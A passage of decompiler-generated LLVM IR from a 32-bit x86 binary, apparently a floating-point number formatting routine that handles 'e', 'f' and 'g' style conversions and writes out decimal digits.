  %v3_80526b3 = mul i32 %v1_80526ac, 12
  store i32 %v3_80526b3, i32* %eax.global-to-local, align 4
  %v1_80526b6 = add i32 %v3_80526b3, ptrtoint (x86_fp80** @global_var_8058540.237 to i32)
  %v2_80526b6 = inttoptr i32 %v1_80526b6 to x86_fp80*
  %v3_80526b6 = load x86_fp80, x86_fp80* %v2_80526b6, align 4
  %v4_80526bc = fmul x86_fp80 %v1_80526e5, %v3_80526b6
  store x86_fp80 %v4_80526bc, x86_fp80* %st1.global-to-local, align 4
  %v4_80526c0 = fcmp ule x86_fp80 %v4_80526bc, %v3_80526b6
  br i1 %v4_80526c0, label %dec_label_pc_80526f5, label %dec_label_pc_80526c4

dec_label_pc_80526c4:                             ; preds = %dec_label_pc_80526b1
  store x86_fp80 %v4_80526bc, x86_fp80* %st1.global-to-local, align 4
  %v5_80526ce = sub i32 %stack_var_-220.0, %v0_80526fb
  br label %dec_label_pc_80526f7

dec_label_pc_80526d4:                             ; preds = %dec_label_pc_80526aa
  %v3_80526d4 = mul i32 %v1_80526ac, 12
  store i32 %v3_80526d4, i32* %eax.global-to-local, align 4
  %v1_80526d7 = add i32 %v3_80526d4, ptrtoint (x86_fp80** @global_var_8058540.237 to i32)
  %v2_80526d7 = inttoptr i32 %v1_80526d7 to x86_fp80*
  %v3_80526d7 = load x86_fp80, x86_fp80* %v2_80526d7, align 4
  %v4_80526dd = fdiv x86_fp80 %v3_80526d7, %v1_80526e5
  store x86_fp80 %v4_80526dd, x86_fp80* %st1.global-to-local, align 4
  %v4_80526df = fcmp ogt x86_fp80 %v3_80526d7, %v1_80526e5
  br i1 %v4_80526df, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_80526d4
  store x86_fp80 %v3_80526d7, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_80526e5

bb183:                                            ; preds = %dec_label_pc_80526d4
  %v5_80526df = fcmp olt x86_fp80 %v3_80526d7, %v1_80526e5
  br i1 %v5_80526df, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_80526d7, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_80526f5

bb184:                                            ; preds = %bb183
  %not.v6_80526df = fcmp une x86_fp80 %v3_80526d7, %v1_80526e5
  store x86_fp80 %v3_80526d7, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_80526df, label %dec_label_pc_80526f5, label %dec_label_pc_80526e5

dec_label_pc_80526e5:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_80526d7, x86_fp80* %st1.global-to-local, align 4
  %v5_80526ef = add i32 %stack_var_-220.0, %v0_80526fb
  br label %dec_label_pc_80526f7

dec_label_pc_80526f5:                             ; preds = %dec_label_pc_80526b1, %.thread51, %bb184
  %v1_80526f5 = phi x86_fp80 [ %v1_80526e5, %.thread51 ], [ %v1_80526e5, %bb184 ], [ %v3_80526b6, %dec_label_pc_80526b1 ]
  %v0_80526aa80 = phi x86_fp80 [ %v3_80526d7, %.thread51 ], [ %v3_80526d7, %bb184 ], [ %v4_80526bc, %dec_label_pc_80526b1 ]
  store x86_fp80 %v1_80526f5, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80526f7

dec_label_pc_80526f7:                             ; preds = %dec_label_pc_80526e5, %dec_label_pc_80526c4, %dec_label_pc_80526f5
  %v2_80526ad81 = phi x86_fp80 [ %v1_80526f5, %dec_label_pc_80526f5 ], [ %v2_80526ad, %dec_label_pc_80526e5 ], [ %v1_80526e5, %dec_label_pc_80526c4 ]
  %v0_80526aa79 = phi x86_fp80 [ %v0_80526aa80, %dec_label_pc_80526f5 ], [ %v3_80526d7, %dec_label_pc_80526e5 ], [ %v4_80526bc, %dec_label_pc_80526c4 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_80526f5 ], [ %v5_80526ef, %dec_label_pc_80526e5 ], [ %v5_80526ce, %dec_label_pc_80526c4 ]
  %v1_80526f7 = icmp eq i32 %v1_80526ac, 0
  br i1 %v1_80526f7, label %.thread60, label %dec_label_pc_80526fb

dec_label_pc_80526fb:                             ; preds = %dec_label_pc_80526f7
  %v2_80526fb = sdiv i32 %v0_80526fb, 2
  store i32 %v2_80526fb, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80526aa

.thread60:                                        ; preds = %dec_label_pc_80526f7
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_805271f

dec_label_pc_805271f:                             ; preds = %dec_label_pc_8052602, %.thread60
  %v0_80527d9 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_8052602 ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_8052602 ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_8052723 = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_80525fa, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8052736 = and i32 %v2_8052723, -65536
  %v1_805273b = udiv i16 %tmp146, 256
  %v2_805273b = zext i16 %v1_805273b to i32
  %v3_805273b = or i32 %v2_805273b, 12
  %v10_805273b = mul nuw nsw i32 %v3_805273b, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_8052736.masked = zext i16 %tmp194 to i32
  %v11_805273b = or i32 %v10_805273b, %v4_8052736.masked
  %v12_805273b = or i32 %v11_805273b, %v6_8052736
  store i32 %v12_805273b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052743

dec_label_pc_8052743:                             ; preds = %dec_label_pc_8052795.dec_label_pc_8052743_crit_edge, %dec_label_pc_805271f
  %v2_8052768 = phi x86_fp80 [ %storemerge, %dec_label_pc_805271f ], [ %v2_8052768.pre, %dec_label_pc_8052795.dec_label_pc_8052743_crit_edge ]
  %v1_8052743 = phi i3 [ %v1_80525fa, %dec_label_pc_805271f ], [ %v1_8052743.pre, %dec_label_pc_8052795.dec_label_pc_8052743_crit_edge ]
  %v3_805276a = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_805271f ], [ %v0_8052743.pre, %dec_label_pc_8052795.dec_label_pc_8052743_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8052723, %dec_label_pc_805271f ], [ %v4_8052763, %dec_label_pc_8052795.dec_label_pc_8052743_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_805276a to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_805275d = sitofp i32 %tmp195 to x86_fp80
  %v4_8052763 = add i32 %stack_var_-212.0, 9
  %v4_8052768 = fsub x86_fp80 %v2_8052768, %v5_805275d
  store i3 %v1_8052743, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_805276a = fmul x86_fp80 %v3_805276a, %v4_8052768
  store x86_fp80 %v4_805276a, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805276c

dec_label_pc_805276c:                             ; preds = %dec_label_pc_805276c.dec_label_pc_805276c_crit_edge, %dec_label_pc_8052743
  %v0_8052780 = phi i32 [ %v0_8052780.pre, %dec_label_pc_805276c.dec_label_pc_805276c_crit_edge ], [ %tmp195, %dec_label_pc_8052743 ]
  %v0_8052770 = phi i32 [ %v0_8052770.pre, %dec_label_pc_805276c.dec_label_pc_805276c_crit_edge ], [ 0, %dec_label_pc_8052743 ]
  %v1_8052770 = add i32 %v0_8052770, 1
  store i32 %v1_8052770, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_805277a = sub i32 %v4_8052763, %v1_8052770
  %div = udiv i32 %v0_8052780, 10
  %tmp185 = urem i32 %v0_8052780, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8052786 = and i32 %div, 536870656
  store i32 %v2_805277a, i32* %edx.global-to-local, align 4
  %v1_805278c = trunc i32 %tmp185 to i8
  %v2_805278c = or i8 %v1_805278c, 48
  %v12_805278c = zext i8 %v2_805278c to i32
  %v15_805278c = or i32 %v12_805278c, %v3_8052786
  store i32 %v15_805278c, i32* %eax.global-to-local, align 4
  %v3_8052791 = inttoptr i32 %v2_805277a to i8*
  store i8 %v2_805278c, i8* %v3_8052791, align 1
  %v7_8052793 = icmp sgt i32 %v1_8052770, 8
  br i1 %v7_8052793, label %dec_label_pc_8052795, label %dec_label_pc_805276c.dec_label_pc_805276c_crit_edge

dec_label_pc_805276c.dec_label_pc_805276c_crit_edge: ; preds = %dec_label_pc_805276c
  %v0_8052770.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8052780.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805276c

dec_label_pc_8052795:                             ; preds = %dec_label_pc_805276c
  %v0_8052795 = load i32, i32* @edi, align 4
  %v1_8052795 = add i32 %v0_8052795, 1
  store i32 %v1_8052795, i32* @edi, align 4
  %v7_8052799 = icmp sgt i32 %v1_8052795, 2
  br i1 %v7_8052799, label %dec_label_pc_805279b, label %dec_label_pc_8052795.dec_label_pc_8052743_crit_edge

dec_label_pc_8052795.dec_label_pc_8052743_crit_edge: ; preds = %dec_label_pc_8052795
  %v0_8052743.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8052743.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8052768.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8052743

dec_label_pc_805279b:                             ; preds = %dec_label_pc_8052795
  %v0_805279b = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_805279b = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_805279b, x86_fp80* %st0.global-to-local, align 4
  %v2_805279d = add i3 %v0_805279b, 2
  store i3 %v2_805279d, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_805279f = add i8 %stack_var_-207.0, -96
  %v6_805279f = sub i8 95, %stack_var_-207.0
  %v7_805279f = and i8 %v6_805279f, %stack_var_-207.0
  %v8_805279f = icmp slt i8 %v7_805279f, 0
  %v9_805279f = icmp eq i8 %v4_805279f, 0
  %v10_805279f = icmp slt i8 %v4_805279f, 0
  %v3_80527a4 = icmp eq i1 %v10_805279f, %v8_805279f
  %v4_80527a4 = icmp eq i1 %v9_805279f, false
  %v5_80527a4 = and i1 %v4_80527a4, %v3_80527a4
  br i1 %v5_80527a4, label %dec_label_pc_80527b3, label %dec_label_pc_80527a6

dec_label_pc_80527a6:                             ; preds = %dec_label_pc_805279b
  %v4_80527a6 = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_80527b3

dec_label_pc_80527b3:                             ; preds = %dec_label_pc_805279b, %dec_label_pc_80527a6
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_805279b ], [ %v4_80527a6, %dec_label_pc_80527a6 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_805279b ], [ 69, %dec_label_pc_80527a6 ]
  %v12_80527b3 = icmp eq i8 %stack_var_-207.1, 103
  %v1_80527b8 = icmp eq i1 %v12_80527b3, false
  br i1 %v1_80527b8, label %dec_label_pc_80527c1, label %dec_label_pc_80527ba

dec_label_pc_80527ba:                             ; preds = %dec_label_pc_80527b3
  %v0_80527ba = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_80527ba, 1
  br i1 %tmp186, label %dec_label_pc_80527c8, label %dec_label_pc_80527be

dec_label_pc_80527be:                             ; preds = %dec_label_pc_80527ba
  %v1_80527be = add i32 %v0_80527ba, -1
  store i32 %v1_80527be, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80527c8

dec_label_pc_80527c1:                             ; preds = %dec_label_pc_80527b3
  %v12_80527c1 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_80527c1, label %dec_label_pc_80527cc, label %dec_label_pc_80527c1.dec_label_pc_80527c8_crit_edge

dec_label_pc_80527c1.dec_label_pc_80527c8_crit_edge: ; preds = %dec_label_pc_80527c1
  %v0_80527c8.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80527c8

dec_label_pc_80527c8:                             ; preds = %dec_label_pc_80527c1.dec_label_pc_80527c8_crit_edge, %dec_label_pc_80527ba, %dec_label_pc_80527be
  %v0_80527c8 = phi i32 [ %v0_80527c8.pre, %dec_label_pc_80527c1.dec_label_pc_80527c8_crit_edge ], [ %v0_80527ba, %dec_label_pc_80527ba ], [ %v1_80527be, %dec_label_pc_80527be ]
  store i32 %v0_80527c8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80527f9

dec_label_pc_80527cc:                             ; preds = %dec_label_pc_80527c1
  store i32 %v0_80527d9, i32* %eax.global-to-local, align 4
  %v0_80527d0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80527d0 = add i32 %v0_80527d0, %v0_80527d9
  store i32 %v2_80527d0, i32* %ebx.global-to-local, align 4
  %v5_80527d7 = icmp slt i32 %v2_80527d0, -1
  br i1 %v5_80527d7, label %dec_label_pc_80527d9, label %dec_label_pc_80527f9

dec_label_pc_80527d9:                             ; preds = %dec_label_pc_80527cc
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80527e1 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80527e1, i32* %eax.global-to-local, align 4
  %v4_80527e9 = bitcast i32* %stack_var_-72 to i8*
  %v5_80527e9 = call i32 @__GI_memset(i8* %v4_80527e9, i32 48, i32 21)
  store i32 %v5_80527e9, i32* %eax.global-to-local, align 4
  %v0_80527f9.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80527f9

dec_label_pc_80527f9:                             ; preds = %dec_label_pc_80527cc, %dec_label_pc_80527d9, %dec_label_pc_80527c8
  %v1_8052819 = phi i32 [ %v0_80527c8, %dec_label_pc_80527c8 ], [ %v2_80527d0, %dec_label_pc_80527cc ], [ %v0_80527f9.pr.pre, %dec_label_pc_80527d9 ]
  %stack_var_-220.3 = phi i32 [ %v0_80527d9, %dec_label_pc_80527c8 ], [ %v0_80527d9, %dec_label_pc_80527cc ], [ -1, %dec_label_pc_80527d9 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_805280c = icmp sgt i32 %v1_8052819, 20
  br i1 %v7_805280c, label %dec_label_pc_805280e, label %dec_label_pc_8052819

dec_label_pc_805280e:                             ; preds = %dec_label_pc_80527f9
  %v2_805280e = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_805280e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805282d.preheader

dec_label_pc_8052819:                             ; preds = %dec_label_pc_80527f9
  %v0_8052819 = load i32, i32* @esp, align 4
  %v2_8052819 = add i32 %v1_8052819, 165
  %v3_8052819 = add i32 %v2_8052819, %v0_8052819
  store i32 %v3_8052819, i32* %eax.global-to-local, align 4
  %v1_8052820 = add i32 %v3_8052819, 2
  %v2_8052820 = inttoptr i32 %v1_8052820 to i8*
  %v3_8052820 = load i8, i8* %v2_8052820, align 1
  %v4_8052820 = add i8 %v3_8052820, -53
  %v9_8052820 = sub i8 52, %v3_8052820
  %v10_8052820 = and i8 %v9_8052820, %v3_8052820
  %v11_8052820 = icmp slt i8 %v10_8052820, 0
  %v13_8052820 = icmp slt i8 %v4_8052820, 0
  store i32 %v1_8052820, i32* %ecx.global-to-local, align 4
  %v2_8052827 = icmp eq i1 %v13_8052820, %v11_8052820
  %v3_8052827 = zext i1 %v2_8052827 to i32
  br label %dec_label_pc_805282d.preheader

dec_label_pc_805282d.preheader:                   ; preds = %dec_label_pc_8052819, %dec_label_pc_805280e
  %v0_805282d102 = phi i32 [ %v1_8052820, %dec_label_pc_8052819 ], [ %v2_805280e, %dec_label_pc_805280e ]
  %storemerge71 = phi i32 [ %v3_8052827, %dec_label_pc_8052819 ], [ 0, %dec_label_pc_805280e ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805282d

dec_label_pc_805282d:                             ; preds = %dec_label_pc_805282d.backedge, %dec_label_pc_805282d.preheader
  %v3_805282e = phi i32 [ %v3_805282e.pre, %dec_label_pc_805282d.backedge ], [ %storemerge71, %dec_label_pc_805282d.preheader ]
  %v0_805282d = phi i32 [ %v0_8052830, %dec_label_pc_805282d.backedge ], [ %v0_805282d102, %dec_label_pc_805282d.preheader ]
  %v1_805282d = add i32 %v0_805282d, -1
  store i32 %v1_805282d, i32* %ecx.global-to-local, align 4
  %v1_805282e = inttoptr i32 %v1_805282d to i8*
  %v2_805282e = load i8, i8* %v1_805282e, align 1
  %v4_805282e = trunc i32 %v3_805282e to i8
  %v5_805282e = add i8 %v2_805282e, %v4_805282e
  store i8 %v5_805282e, i8* %v1_805282e, align 1
  %v0_8052830 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052830 = inttoptr i32 %v0_8052830 to i8*
  %v2_8052830 = load i8, i8* %v1_8052830, align 1
  %v3_8052830 = zext i8 %v2_8052830 to i32
  %v4_8052830 = load i32, i32* %edx.global-to-local, align 4
  %v5_8052830 = and i32 %v4_8052830, -256
  %v6_8052830 = or i32 %v5_8052830, %v3_8052830
  store i32 %v6_8052830, i32* %edx.global-to-local, align 4
  %v7_8052832 = icmp eq i8 %v2_8052830, 48
  br i1 %v7_8052832, label %dec_label_pc_805282d.backedge, label %dec_label_pc_8052837

dec_label_pc_805282d.backedge:                    ; preds = %dec_label_pc_805282d, %dec_label_pc_8052837
  %v3_805282e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805282d

dec_label_pc_8052837:                             ; preds = %dec_label_pc_805282d
  %v2_8052837 = add i8 %v2_8052830, -57
  %v7_8052837 = sub i8 56, %v2_8052830
  %v8_8052837 = and i8 %v7_8052837, %v2_8052830
  %v9_8052837 = icmp slt i8 %v8_8052837, 0
  %v10_8052837 = icmp eq i8 %v2_8052837, 0
  %v11_8052837 = icmp slt i8 %v2_8052837, 0
  %v3_805283a = icmp eq i1 %v11_8052837, %v9_8052837
  %v4_805283a = icmp eq i1 %v10_8052837, false
  %v5_805283a = and i1 %v4_805283a, %v3_805283a
  br i1 %v5_805283a, label %dec_label_pc_805282d.backedge, label %dec_label_pc_805283c

dec_label_pc_805283c:                             ; preds = %dec_label_pc_8052837
  %v2_805283c = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_805283c, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8052830, %v2_805283c
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_8052847, label %dec_label_pc_8052854

dec_label_pc_8052847:                             ; preds = %dec_label_pc_805283c
  store i32 %v2_8052723, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805285d

dec_label_pc_8052854:                             ; preds = %dec_label_pc_805283c
  store i32 %v2_805283c, i32* %edx.global-to-local, align 4
  store i32 %v2_805283c, i32* %ecx.global-to-local, align 4
  %v1_805285c = add i32 %stack_var_-220.3, 1
  store i32 %v1_805285c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805285d

dec_label_pc_805285d:                             ; preds = %dec_label_pc_8052847, %dec_label_pc_8052854
  %v0_805285d = phi i32 [ %v0_8052830, %dec_label_pc_8052847 ], [ %v2_805283c, %dec_label_pc_8052854 ]
  %v1_805285d = add i32 %v0_805285d, 1
  store i32 %v1_805285d, i32* %eax.global-to-local, align 4
  %v2_8052864 = inttoptr i32 %v1_805285d to i8*
  store i8 0, i8* %v2_8052864, align 1
  br i1 %v1_80527b8, label %dec_label_pc_805288a, label %dec_label_pc_805286f

dec_label_pc_805286f:                             ; preds = %dec_label_pc_805285d
  %v0_805286f = load i32, i32* %esi.global-to-local, align 4
  %v5_8052872 = icmp slt i32 %v0_805286f, -4
  br i1 %v5_8052872, label %dec_label_pc_8052897, label %dec_label_pc_8052874

dec_label_pc_8052874:                             ; preds = %dec_label_pc_805286f
  %v1_8052874 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8052876 = icmp slt i32 %v1_8052874, %v0_805286f
  br i1 %v7_8052876, label %dec_label_pc_8052897, label %dec_label_pc_805287f

dec_label_pc_805287f:                             ; preds = %dec_label_pc_8052874
  %v2_8052881 = sub i32 %v1_8052874, %v0_805286f
  store i32 %v2_8052881, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805289b

dec_label_pc_805288a:                             ; preds = %dec_label_pc_805285d
  %v4_805288a = zext i8 %stack_var_-207.1 to i32
  %v5_805288a = load i32, i32* %ebx.global-to-local, align 4
  %v6_805288a = and i32 %v5_805288a, -256
  %v7_805288a = or i32 %v6_805288a, %v4_805288a
  store i32 %v7_805288a, i32* %ebx.global-to-local, align 4
  %v10_805288e = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_805288e, label %dec_label_pc_805288a.dec_label_pc_805289b_crit_edge, label %dec_label_pc_8052897

dec_label_pc_805288a.dec_label_pc_805289b_crit_edge: ; preds = %dec_label_pc_805288a
  %v0_805289b.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805289b

dec_label_pc_8052897:                             ; preds = %dec_label_pc_805286f, %dec_label_pc_8052874, %dec_label_pc_805288a
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_805288a ], [ 103, %dec_label_pc_8052874 ], [ 103, %dec_label_pc_805286f ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80528a5

dec_label_pc_805289b:                             ; preds = %dec_label_pc_805288a.dec_label_pc_805289b_crit_edge, %dec_label_pc_805287f
  %v0_805289d = phi i32 [ %v0_805289b.pre, %dec_label_pc_805288a.dec_label_pc_805289b_crit_edge ], [ %v0_805286f, %dec_label_pc_805287f ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_805288a.dec_label_pc_805289b_crit_edge ], [ 102, %dec_label_pc_805287f ]
  %v2_805289b = icmp slt i32 %v0_805289d, 0
  store i32 %v0_805289d, i32* %ebx.global-to-local, align 4
  %v1_805289f = icmp eq i1 %v2_805289b, false
  br i1 %v1_805289f, label %dec_label_pc_80528a5, label %dec_label_pc_80528a1

dec_label_pc_80528a1:                             ; preds = %dec_label_pc_805289b
  %v0_80528a1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80528a1 = add i32 %v0_80528a1, -1
  store i32 %v1_80528a1, i32* %edx.global-to-local, align 4
  %v1_80528a2 = inttoptr i32 %v1_80528a1 to i8*
  store i8 48, i8* %v1_80528a2, align 1
  %v0_80528da.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80528a5

dec_label_pc_80528a5:                             ; preds = %dec_label_pc_805289b, %dec_label_pc_8052897, %dec_label_pc_80528a1
  %v1_8052935 = phi i32 [ %v0_805289d, %dec_label_pc_805289b ], [ %v0_80528da.pre, %dec_label_pc_80528a1 ], [ 0, %dec_label_pc_8052897 ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_805289b ], [ %stack_var_-197.1, %dec_label_pc_80528a1 ], [ %stack_var_-197.0, %dec_label_pc_8052897 ]
  %v2_80528a5 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80528a5, i32* %eax.global-to-local, align 4
  %v0_80528b4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80528b4 = add i32 %v0_80528b4, 1
  store i32 %v1_80528b4, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_80528c3 = inttoptr i32 %v0_80528b4 to i8*
  %v2_80528c3 = load i8, i8* %v1_80528c3, align 1
  %v3_80528c3 = zext i8 %v2_80528c3 to i32
  %v5_80528c3 = and i32 %v2_80528a5, -256
  %v6_80528c3 = or i32 %v3_80528c3, %v5_80528c3
  store i32 %v6_80528c3, i32* %eax.global-to-local, align 4
  store i32 %v6_80528c3, i32* %stack_var_-22, align 4
  %v2_80528d8 = sub i32 %v1_805285d, %v1_80528b4
  store i32 %v2_80528d8, i32* %edx.global-to-local, align 4
  %v1_80528da = icmp eq i32 %v1_8052935, 0
  %v2_80528da = icmp slt i32 %v1_8052935, 0
  br i1 %v2_80528da, label %dec_label_pc_8052929, label %dec_label_pc_80528de

dec_label_pc_80528de:                             ; preds = %dec_label_pc_80528a5
  %v2_80528de = sub i32 %v1_8052935, %v2_80528d8
  %v8_80528de = xor i32 %v2_80528d8, %v1_8052935
  %v9_80528de = xor i32 %v2_80528de, %v1_8052935
  %v10_80528de = and i32 %v9_80528de, %v8_80528de
  %v11_80528de = icmp slt i32 %v10_80528de, 0
  %v13_80528de = icmp slt i32 %v2_80528de, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_80528ec = icmp eq i1 %v13_80528de, %v11_80528de
  br i1 %v2_80528ec, label %dec_label_pc_80528ee, label %dec_label_pc_8052922

dec_label_pc_80528ee:                             ; preds = %dec_label_pc_80528de
  store i32 %v2_80528de, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_80528de, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_8052903, label %dec_label_pc_805291e

dec_label_pc_8052903:                             ; preds = %dec_label_pc_80528ee
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_805291e

dec_label_pc_805291e:                             ; preds = %dec_label_pc_80528ee, %dec_label_pc_8052903
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_8052903 ], [ %stack_var_-132, %dec_label_pc_80528ee ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805293e

dec_label_pc_8052922:                             ; preds = %dec_label_pc_80528de
  %v4_8052924 = icmp eq i1 %v1_80528da, false
  br i1 %v4_8052924, label %dec_label_pc_805292f, label %dec_label_pc_8052926

dec_label_pc_8052926:                             ; preds = %dec_label_pc_8052922
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052929

dec_label_pc_8052929:                             ; preds = %dec_label_pc_80528a5, %dec_label_pc_8052926
  %v0_8052971112 = phi i32 [ %v1_8052935, %dec_label_pc_80528a5 ], [ -1, %dec_label_pc_8052926 ]
  %v2_8052929 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052929, i32* @ecx, align 4
  br label %dec_label_pc_805293e

dec_label_pc_805292f:                             ; preds = %dec_label_pc_8052922
  %v2_8052933 = add i32 %v1_80528b4, %v1_8052935
  store i32 %v2_8052933, i32* %edi.global-to-local, align 4
  %v2_8052935 = sub i32 %v2_80528d8, %v1_8052935
  store i32 %v2_8052935, i32* %edx.global-to-local, align 4
  %v2_8052937 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8052937, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805293e

dec_label_pc_805293e:                             ; preds = %dec_label_pc_8052929, %dec_label_pc_805291e, %dec_label_pc_805292f
  %v0_8052971111 = phi i32 [ %v0_8052971112, %dec_label_pc_8052929 ], [ -1, %dec_label_pc_805291e ], [ -1, %dec_label_pc_805292f ]
  %v0_805295a = phi i32 [ %v2_8052929, %dec_label_pc_8052929 ], [ %storemerge28, %dec_label_pc_805291e ], [ %v2_8052937, %dec_label_pc_805292f ]
  %v0_805294b = phi i32 [ %v2_80528d8, %dec_label_pc_8052929 ], [ 0, %dec_label_pc_805291e ], [ %v2_8052935, %dec_label_pc_805292f ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_8052945 = inttoptr i32 %v1_80525bb to i8*
  %v3_8052945 = load i8, i8* %v2_8052945, align 1
  %v4_8052945 = and i8 %v3_8052945, 16
  %v5_8052945 = icmp eq i8 %v4_8052945, 0
  %v1_8052949 = icmp eq i1 %v5_8052945, false
  br i1 %v1_8052949, label %dec_label_pc_805295a, label %dec_label_pc_805294b

dec_label_pc_805294b:                             ; preds = %dec_label_pc_805293e
  %v1_805294b = icmp eq i32 %v0_805294b, 0
  %v1_805294d = icmp eq i1 %v1_805294b, false
  br i1 %v1_805294d, label %dec_label_pc_805295a, label %dec_label_pc_805294f

dec_label_pc_805294f:                             ; preds = %dec_label_pc_805294b
  br i1 %v12_80527b3, label %dec_label_pc_8052971, label %dec_label_pc_8052956

dec_label_pc_8052956:                             ; preds = %dec_label_pc_805294f
  %v0_8052956 = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_8052956, 1
  br i1 %tmp189, label %dec_label_pc_8052971, label %dec_label_pc_805295a

dec_label_pc_805295a:                             ; preds = %dec_label_pc_8052956, %dec_label_pc_805294b, %dec_label_pc_805293e
  %v1_805295a = inttoptr i32 %v0_805295a to i32*
  store i32 112, i32* %v1_805295a, align 4
  %v0_8052960 = load i32, i32* @ecx, align 4
  %v1_8052960 = add i32 %v0_8052960, 4
  %v2_8052960 = inttoptr i32 %v1_8052960 to i32*
  store i32 1, i32* %v2_8052960, align 4
  %v0_8052967 = load i32, i32* @ecx, align 4
  %v1_8052967 = add i32 %v0_8052967, 8
  %v2_8052967 = inttoptr i32 %v1_8052967 to i32*
  store i32 ptrtoint (i32* @global_var_8058520.240 to i32), i32* %v2_8052967, align 4
